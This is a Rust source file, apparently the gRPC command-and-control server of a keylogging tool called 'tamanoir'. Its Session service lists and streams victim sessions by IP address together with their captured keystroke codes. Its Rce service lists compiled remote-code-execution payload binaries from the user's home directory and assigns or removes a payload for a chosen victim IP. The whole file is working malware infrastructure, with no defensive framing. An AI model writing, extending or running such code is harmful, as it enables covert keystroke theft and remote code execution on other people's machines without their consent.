use std::{net::Ipv4Addr, pin::Pin, str::FromStr};

use home::home_dir;
use log::{debug, info};
use tokio::fs;
use tokio_stream::Stream;
use tonic::{transport::Server, Code, Request, Response, Status};

use crate::{
    tamanoir_grpc::{
        rce_server::{Rce, RceServer},
        session_server::{Session, SessionServer},
        AvailableRceResponse, DeleteSessionRceRequest, Empty, ListSessionsResponse,
        SessionRcePayload, SessionResponse, SetSessionRceRequest,
    },
    SessionsStore, TargetArch,
};

pub async fn serve_tonic(grpc_port: u16, sessions_store: SessionsStore) -> anyhow::Result<()> {
    let addr = format!("0.0.0.0:{}", grpc_port).parse().unwrap();
    info!("Starting grpc server");
    debug!("Grpc server is listening on {}", addr);
    Server::builder()
        .add_service(SessionServer::new(sessions_store.clone()))
        .add_service(RceServer::new(sessions_store))
        .serve(addr)
        .await?;
    Ok(())
}

#[tonic::async_trait]
impl Session for SessionsStore {
    async fn list_sessions(
        &self,
        request: Request<Empty>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        debug!(
            "<GetSessions> Got a request from {:?}",
            request.remote_addr()
        );
        let current_sessions = self.sessions.lock().await;

        let mut sessions: Vec<SessionResponse> = vec![];
        for s in current_sessions.values().into_iter() {
            let rce_payload: Option<SessionRcePayload> = match &s.rce_payload {
                Some(payload) => Some(SessionRcePayload {
                    name: payload.name.clone(),
                    target_arch: payload.target_arch.to_string(),
                    length: payload.length as u32,
                    buffer_length: payload.buffer.len() as u32,
                }),
                _ => None,
            };
            sessions.push(SessionResponse {
                ip: s.ip.to_string(),
                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
                rce_payload: rce_payload,
            })
        }

        let reply = ListSessionsResponse { sessions };
        Ok(Response::new(reply))
    }

    type WatchSessionsStream =
        Pin<Box<dyn Stream<Item = Result<SessionResponse, Status>> + Send + 'static>>;

    async fn watch_sessions(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<Self::WatchSessionsStream>, Status> {
        let mut rx = self.tx.subscribe();

        let stream = async_stream::try_stream! {
        while let Ok(session) = rx.recv().await {

                let rce_payload:Option<SessionRcePayload> = match session.rce_payload   {
                    Some(payload) => Some(SessionRcePayload {name:payload.name,target_arch:payload.target_arch.to_string(),length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
                    _ => None,
                };

                yield SessionResponse {
                    ip: session.ip.to_string(),
                    key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
                    rce_payload: rce_payload
                };


        }
        };
        Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
    }
}

fn extract_rce_metadata(path: String) -> Option<(String, TargetArch)> {
    let p: Vec<&str> = path.split("/").collect();
    let p = p[p.len() - 1];
    let trimmed: String = p.replace("tamanoir-rce-", "").replace(".bin", "");
    let split: Vec<&str> = trimmed.split("_").collect();
    if split.len() < 2 {
        return None;
    }
    let name = split[0];
    let arch = split[1..].join("_");
    if let Ok(arch) = TargetArch::from_str(&arch) {
        return Some((name.into(), arch));
    }
    None
}
#[tonic::async_trait]
impl Rce for SessionsStore {
    async fn delete_session_rce(
        &self,
        request: Request<DeleteSessionRceRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<DeleteSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::NotFound, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;

        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                existing_session.reset_rce_payload();
                self.try_send(existing_session.clone())
                    .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;

                Ok(Response::new(Empty {}))
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
    async fn list_available_rce(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<AvailableRceResponse>, Status> {
        let mut build_dir = home_dir().unwrap();
        build_dir.push(".tamanoir/bins");
        let mut rce_list: Vec<SessionRcePayload> = vec![];
        if build_dir.exists() {
            let mut read_dir = fs::read_dir(build_dir).await?;
            while let Some(entry) = read_dir.next_entry().await? {
                let path = format!("{}", entry.path().display());
                if let Some((name, arch)) = extract_rce_metadata(path) {
                    rce_list.push(SessionRcePayload {
                        name: name,
                        target_arch: arch.to_string(),
                        buffer_length: 0,
                        length: 0,
                    })
                }
            }
        }
        Ok(Response::new(AvailableRceResponse { rce_list }))
    }
    async fn set_session_rce(
        &self,
        request: Request<SetSessionRceRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<SetSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::InvalidArgument, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;
        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
            Status::new(
                Code::InvalidArgument,
                format!("{}: unknown target arch", req.target_arch),
            )
        })?;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                match existing_session.set_rce_payload(&req.rce, target_arch) {
                    Ok(_) => {
                        self.try_send(existing_session.clone())
                            .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
                        Ok(Response::new(Empty {}))
                    }
                    Err(e) => Err(Status::new(
                        Code::InvalidArgument,
                        format!("{}: invalid rce ({})", req.rce, e),
                    )),
                }
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
}
